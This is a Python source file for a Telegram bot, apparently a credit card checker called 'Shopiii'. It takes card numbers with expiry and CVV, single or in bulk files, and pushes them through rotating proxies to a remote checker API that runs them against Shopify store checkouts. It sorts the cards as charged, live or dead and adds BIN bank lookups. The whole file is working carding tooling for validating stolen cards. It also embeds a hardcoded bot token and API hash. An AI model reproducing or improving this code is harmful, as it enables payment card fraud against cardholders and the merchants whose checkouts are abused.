from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime

CHECKER_API_URL = 'https://backend-vxo-production.up.railway.app/check'

PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088",
    "🔥": "5999340396432333728",
    "❌": "6037570896766438989",
    "⚡": "6026367225466720832",
    "💳": "5971944878815317190",
    "💠": "5971837723676249096",
    "📝": "6023660820544623088",
    "🌐": "6026367225466720832",
    "🎯": "5974235702701853774",
    "🤖": "6057466460886799210",
    "🤵": "4949560993840629085",
    "💰": "5971944878815317190",
    "⏸️": "6001440193058444284",
    "▶️": "6285315214673975495",
    "🛑": "5420323339723881652",
    "📊": "5971837723676249096",
    "📦": "6066395745139824604",
    "📋": "5974235702701853774",
    "🔄": "5971837723676249096",
    "⏳": "5971837723676249096",
    "🚀": "6282977077427702833",
    "⚠️": "5420323339723881652",
    "💎": "6023660820544623088",
}

def premium_emoji(text):
    if not text:
        return text
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

API_ID = 21124241
API_HASH = 'b7ddce3d3683f54be788fddae73fa468'
BOT_TOKEN = '8872654381:AAF8rRvAvid-JtbU7AbpU8g4acECXfIfRh0'

# Automatically resolve paths relative to the script's directory on Railway/VPS
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PREMIUM_FILE = os.path.join(BASE_DIR, 'premium.txt')
SITES_FILE = os.path.join(BASE_DIR, 'sites.txt')
PROXY_FILE = os.path.join(BASE_DIR, 'proxy.txt')

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}

_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        print(f"[Warning] File not found: {filepath}")
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return []

def load_premium_users():
    users = get_file_lines(PREMIUM_FILE)
    return users

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

def is_premium(user_id):
    users = load_premium_users()
    return str(user_id) in users

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                data = json.loads(await res.text())
                return data.get('brand', '-'), data.get('type', '-'), data.get('level', '-'), data.get('bank', '-'), data.get('country_name', '-'), data.get('country_flag', '')
    except Exception:
        return '-', '-', '-', '-', '-', ''

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}

        formatted_proxy = proxy.strip()
        if formatted_proxy:
            if '://' not in formatted_proxy:
                p_parts = formatted_proxy.split(':')
                if len(p_parts) == 4:
                    ip, port, user, pwd = p_parts
                    formatted_proxy = f"http://{user}:{pwd}@{ip}:{port}"
                else:
                    formatted_proxy = f"http://{formatted_proxy}"

        params = {'card': card, 'url': site, 'proxy': formatted_proxy, 'low': 'true'}
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                text_response = await resp.text()
                raw = json.loads(text_response)

        response_msg = raw.get('error', '') or raw.get('Response', '')
        price = raw.get('amount', '') or raw.get('Price', '-')
        gate = raw.get('Gate', 'Shopify')
        status = raw.get('status', '') or raw.get('Response', '')

        if is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        response_lower = str(response_msg).lower()
        if status == 'CHARGED' or 'order completed' in response_lower or '💎' in str(response_msg) or 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif status == 'APPROVED' or any(k in response_lower for k in ['approved', 'success', 'insufficient_funds', 'insufficient funds', 'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc', 'incorrect_zip']):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
    except Exception as e:
        return {'status': 'Dead', 'message': str(e), 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    if not sites or not proxies:
        return {'status': 'Dead', 'message': 'No sites or proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    for attempt in range(max_retries):
        res = await check_card(card, random.choice(sites), random.choice(proxies))
        if not res.get('retry'):
            return res
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def test_site(site, proxy):
    try:
        res = await check_card("5154623245618097|03|2032|156", site, proxy)
        if res.get('status') == 'Site Error' or 'dead' in str(res.get('message', '')).lower():
            return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
    except:
        return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    try:
        res = await check_card("5154623245618097|03|2032|156", "https://riverbendhomedev.myshopify.com", proxy)
        if 'proxy dead' in str(res.get('message', '')).lower() or res.get('status') == 'Site Error':
            return {'proxy': proxy, 'status': 'dead'}
        return {'proxy': proxy, 'status': 'alive'}
    except:
        return {'proxy': proxy, 'status': 'dead'}

@bot.on(events.NewMessage(incoming=True, pattern=r'^/start'))
async def start_cmd(event):
    if not is_premium(event.sender_id):
        await event.reply(premium_emoji("❌ <b>Access Denied</b>"), parse_mode='html')
        return
    await event.reply(
        premium_emoji(
            "<b>⚡💳 Welcome to Shopiiiii ! 💳⚡</b>\n"
            "<b>━━━━━━━━━━━━━━━━━</b>\n"
            "<b>⚡💠 𝐂𝐂 𝐂𝐨𝐦𝐦𝐚𝐧𝑑𝐬</b>\n"
            "<blockquote>• /cc card|mm|yy|cvv - Check single CC\n"
            "• /chk - Reply to .txt file to check cards</blockquote>\n"
            "<b>⚡💠 𝐒𝐢𝐭𝐞 𝐂𝐨𝐦𝐦𝐚𝐧𝑑𝐬</b>\n"
            "<blockquote>• /site - Check all sites & remove dead\n"
            "• /rm url - Remove a specific site</blockquote>\n"
            "<b>⚡💠 𝐏𝐫𝐨𝐱𝐲 𝐂𝐨𝐦𝐦𝐚𝐧𝑑𝐬</b>\n"
            "<blockquote>• /proxy - Check all proxies & remove dead\n"
            "• /addproxy [proxy] - Add proxies (inline or new lines)\n"
            "• /chkproxy proxy - Check single proxy\n"
            "• /rmproxy proxy - Remove single proxy\n"
            "• /rmproxyindex 1,2,3 - Remove by index\n"
            "• /clearproxy - Remove all proxies\n"
            "• /getproxy - Get all proxies</blockquote>\n"
            "<b>━━━━━━━━━━━━━━━━━</b>\n"
            "<b>✅ Authorized Premium User.</b>"
        ),
        parse_mode='html'
    )

@bot.on(events.NewMessage(incoming=True, pattern=r'^/cc'))
async def cc_cmd(event):
    if not is_premium(event.sender_id): return
    sites, proxies = load_sites(), load_proxies()
    if not sites or not proxies:
        await event.reply(premium_emoji("❌ Missing sites or proxies."), parse_mode='html')
        return
    cards = extract_cc(event.message.text)
    if not cards:
        await event.reply(premium_emoji("❌ Invalid format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
        return
    card = cards[0]
    msg = await event.reply(premium_emoji(f"<b>Checking...</b> <code>{card}</code>"), parse_mode='html')
    res = await check_card_with_retry(card, sites, proxies, max_retries=3)
    brand, bin_type, level, bank, country, flag = await get_bin_info(card[:6])
    emoji = "✅" if res['status'] == 'Charged' else ("🔥" if res['status'] == 'Approved' else "❌")
    out = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>\n<blockquote>{emoji} Status: {res['status']}</blockquote>\n<blockquote>💳 Card: <code>{res['card']}</code></blockquote>\n<blockquote>📝 Response: {res['message'][:150]}</blockquote>\n<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {res.get('gateway', 'Unknown')} | 💰 {res.get('price', '-')}</blockquote>\n<b>━━━━━━━━━━━━━━━━━</b>\n<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>\n<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}\n𝗕𝗮𝗻𝗸: {bank}\n𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>"""
    await msg.edit(premium_emoji(out), parse_mode='html')

@bot.on(events.NewMessage(incoming=True, pattern=r'^/site'))
async def site_cmd(event):
    if not is_premium(event.sender_id): return
    sites = load_sites()
    proxies = load_proxies()
    if not sites or not proxies:
        await event.reply(premium_emoji("❌ Sites or proxy list empty."), parse_mode='html')
        return
    msg = await event.reply(premium_emoji(f"🔥 Checking {len(sites)} sites..."))
    alive = []
    for s in sites:
        r = await test_site(s, random.choice(proxies))
        if r['status'] == 'alive': alive.append(s)
    async with aiofiles.open(SITES_FILE, 'w', encoding='utf-8') as f:
        for s in alive: await f.write(f"{s}\n")
    await msg.edit(premium_emoji(f"✅ <b>Site check complete!</b> Alive: {len(alive)}/{len(sites)}"), parse_mode='html')

@bot.on(events.NewMessage(incoming=True, pattern=r'^/rm\s+'))
async def rm_site_cmd(event):
    if not is_premium(event.sender_id): return
    parts = event.message.text.split(' ', 1)
    if len(parts) < 2:
        await event.reply(premium_emoji("❌ Usage: `/rm https://site.com`"), parse_mode='html')
        return
    url = parts[1].strip()
    sites = load_sites()
    if url not in sites:
        await event.reply(premium_emoji(f"❌ Site not found: `{url}`"), parse_mode='html')
        return
    new_sites = [s for s in sites if s != url]
    async with aiofiles.open(SITES_FILE, 'w', encoding='utf-8') as f:
        for s in new_sites: await f.write(f"{s}\n")
    await event.reply(premium_emoji(f"✅ <b>Site removed successfully!</b>\n`{url}`"), parse_mode='html')

@bot.on(events.NewMessage(incoming=True, pattern=r'^/proxy$'))
async def proxy_cmd(event):
    if not is_premium(event.sender_id): return
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ `proxy.txt` is empty."), parse_mode='html')
        return
    msg = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies..."))
    alive = []
    for p in proxies:
        r = await test_proxy(p)
        if r['status'] == 'alive': alive.append(p)
    async with aiofiles.open(PROXY_FILE, 'w', encoding='utf-8') as f:
        for p in alive: await f.write(f"{p}\n")
    await msg.edit(premium_emoji(f"✅ <b>Proxy check done!</b> Alive: {len(alive)}/{len(proxies)}"), parse_mode='html')

@bot.on(events.NewMessage(incoming=True, pattern=r'^/chkproxy\s+'))
async def chk_proxy_cmd(event):
    if not is_premium(event.sender_id): return
    parts = event.message.text.split(' ', 1)
    if len(parts) < 2:
        await event.reply(premium_emoji("❌ Usage: <code>/chkproxy ip:port:user:pass</code>"), parse_mode='html')
        return
    proxy = parts[1].strip()
    msg = await event.reply(premium_emoji(f"🔄 Checking proxy: <code>{proxy}</code>..."))
    r = await test_proxy(proxy)
    if r['status'] == 'alive':
        await msg.edit(premium_emoji(f"✅ <b>Proxy is ALIVE!</b>\n<code>{proxy}</code>"), parse_mode='html')
    else:
        await msg.edit(premium_emoji(f"❌ <b>Proxy is DEAD!</b>\n<code>{proxy}</code>"), parse_mode='html')

@bot.on(events.NewMessage(incoming=True, pattern=r'^/addproxy'))
async def add_proxy_cmd(event):
    if not is_premium(event.sender_id): return
    raw_text = event.message.text
    lines = raw_text.split('\n')
    
    to_add = []
    if len(lines) > 1:
        to_add = [l.strip() for l in lines[1:] if l.strip()]
    else:
        parts = raw_text.split(' ', 1)
        if len(parts) > 1 and parts[1].strip():
            to_add = [parts[1].strip()]

    if not to_add:
        await event.reply(premium_emoji("❌ Usage:\n1) `/addproxy ip:port:user:pass`\n2) `/addproxy` followed by proxies on new lines."), parse_mode='html')
        return

    current = load_proxies()
    added = [p for p in to_add if p not in current]
    if not added:
        await event.reply(premium_emoji("⚠️ Provided proxy/proxies already exist in file."), parse_mode='html')
        return

    async with aiofiles.open(PROXY_FILE, 'a', encoding='utf-8') as f:
        for p in added: await f.write(f"{p}\n")
    await event.reply(premium_emoji(f"✅ <b>Successfully Added!</b>\nAdded {len(added)} new proxy(ies) to <code>proxy.txt</code>."), parse_mode='html')

@bot.on(events.NewMessage(incoming=True, pattern=r'^/rmproxy\s+'))
async def rm_proxy_cmd(event):
    if not is_premium(event.sender_id): return
    parts = event.message.text.split(' ', 1)
    if len(parts) < 2: return
    p_rem = parts[1].strip()
    current = load_proxies()
    if p_rem not in current:
        await event.reply(premium_emoji("❌ Proxy not found."), parse_mode='html')
        return
    new_p = [p for p in current if p != p_rem]
    async with aiofiles.open(PROXY_FILE, 'w', encoding='utf-8') as f:
        for p in new_p: await f.write(f"{p}\n")
    await event.reply(premium_emoji(f"✅ Proxy removed: <code>{p_rem}</code>"), parse_mode='html')

@bot.on(events.NewMessage(incoming=True, pattern=r'^/rmproxyindex\s+'))
async def rm_proxy_idx_cmd(event):
    if not is_premium(event.sender_id): return
    parts = event.message.text.split(' ', 1)
    if len(parts) < 2: return
    try:
        indices = [int(i.strip()) - 1 for i in parts[1].split(',')]
    except:
        await event.reply(premium_emoji("❌ Invalid format. Use comma separated numbers."), parse_mode='html')
        return
    current = load_proxies()
    new_p = [p for idx, p in enumerate(current) if idx not in indices]
    async with aiofiles.open(PROXY_FILE, 'w', encoding='utf-8') as f:
        for p in new_p: await f.write(f"{p}\n")
    await event.reply(premium_emoji(f"✅ Removed proxies by index."), parse_mode='html')

@bot.on(events.NewMessage(incoming=True, pattern=r'^/clearproxy$'))
async def clear_proxy_cmd(event):
    if not is_premium(event.sender_id): return
    async with aiofiles.open(PROXY_FILE, 'w', encoding='utf-8') as f:
        await f.write("")
    await event.reply(premium_emoji("✅ All proxies cleared."), parse_mode='html')

@bot.on(events.NewMessage(incoming=True, pattern=r'^/getproxy$'))
async def get_proxy_cmd(event):
    if not is_premium(event.sender_id): return
    current = load_proxies()
    if not current:
        await event.reply(premium_emoji("❌ No proxies found."), parse_mode='html')
        return
    if len(current) <= 30:
        lst = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current)])
        await event.reply(premium_emoji(f"<b>Proxies ({len(current)}):</b>\n\n{lst}"), parse_mode='html')
    else:
        fn = f"proxies_{event.sender_id}.txt"
        async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
            for i, p in enumerate(current): await f.write(f"{i+1}. {p}\n")
        await event.reply(file=fn)
        try:
            os.remove(fn)
        except:
            pass

@bot.on(events.NewMessage(incoming=True, pattern=r'^/chk$'))
async def chk_cmd(event):
    user_id = event.sender_id
    if not is_premium(user_id) or not event.reply_to_msg_id:
        return
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        return
    sites, proxies = load_sites(), load_proxies()
    if not sites or not proxies:
        await event.reply(premium_emoji("❌ Missing sites or proxies."))
        return

    status_msg = await event.reply(premium_emoji("🫆 Processing your file..."))
    path = await reply.download_media()
    async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
        cards = extract_cc(await f.read())
    try:
        os.remove(path)
    except:
        pass

    if not cards:
        await status_msg.edit(premium_emoji("😡 No valid cards found."))
        return

    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}
    results = {'charged': [], 'approved': [], 'dead': [], 'total': len(cards), 'checked': 0, 'start_time': time.time()}

    q = asyncio.Queue()
    for c in cards: q.put_nowait(c)
    last_up = [time.time()]

    async def worker():
        while not q.empty() and session_key in active_sessions:
            if active_sessions[session_key].get('paused', False):
                await asyncio.sleep(1)
                continue
            try: card = q.get_nowait()
            except: break
            res = await check_card_with_retry(card, load_sites(), load_proxies(), max_retries=1)
            results['checked'] += 1
            if res['status'] == 'Charged': results['charged'].append(res)
            elif res['status'] == 'Approved': results['approved'].append(res)
            else: results['dead'].append(res)
            q.task_done()
            if time.time() - last_up[0] >= 1.0:
                last_up[0] = time.time()
                if session_key in active_sessions:
                    try:
                        elapsed = int(time.time() - results['start_time'])
                        h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
                        gw = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
                        prog = f"<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>\n<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>\n<blockquote>📊 Checked: {results['checked']}/{results['total']}</blockquote>\n<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gw}</blockquote>\n<blockquote>⏱️ Time: {h}h {m}m {s}s</blockquote>\n<b>━━━━━━━━━━━━━━━━━</b>"
                        btns = [[Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")], [Button.inline("🛑 Stop", b"stop")]]
                        await bot.edit_message(user_id, status_msg.id, premium_emoji(prog), buttons=btns, parse_mode='html')
                    except: pass

    workers = [asyncio.create_task(worker()) for _ in range(10)]
    await asyncio.gather(*workers, return_exceptions=True)

    if session_key in active_sessions: del active_sessions[session_key]
    try: await status_msg.delete()
    except Exception: pass

    elapsed = int(time.time() - results['start_time'])
    h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    hits_txt = "".join([f"✅ <code>{r['card']}</code>\n" for r in results['charged'][:5]]) + "".join([f"🔥 <code>{r['card']}</code>\n" for r in results['approved'][:5]]) or "No hits found"
    gw = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    summary = f"<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>\n<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>\n<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gw}</blockquote>\n<blockquote>⏱️ Time: {h}h {m}m {s}s</blockquote>\n<b>━━━━━━━━━━━━━━━━━</b>\n<b>🎯💠 𝐇𝐢𝐭𝐬</b>\n<blockquote>{hits_txt}</blockquote>\n<b>━━━━━━━━━━━━━━━━━</b>\n🤖 <b>Bot By: <a href=\"tg://user?id=5248903529\">ㅤㅤＫａｍａｌ</a></b>"
    
    fname = f"shopiii_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
        await f.write("CC CHECKER RESULTS\n\n")
        for cat, lst in [('CHARGED', results['charged']), ('APPROVED', results['approved']), ('DEAD', results['dead'])]:
            await f.write(f"=== {cat} ({len(lst)}) ===\n")
            for r in lst: await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
    await bot.send_message(user_id, premium_emoji(summary), file=fname, parse_mode='html')
    try:
        os.remove(fname)
    except:
        pass

# Print loaded premium users on startup for verification in Railway logs
print(f"✅ Loaded Premium Users: {load_premium_users()}")
print("✅ Bot started successfully!")
bot.run_until_disconnected()
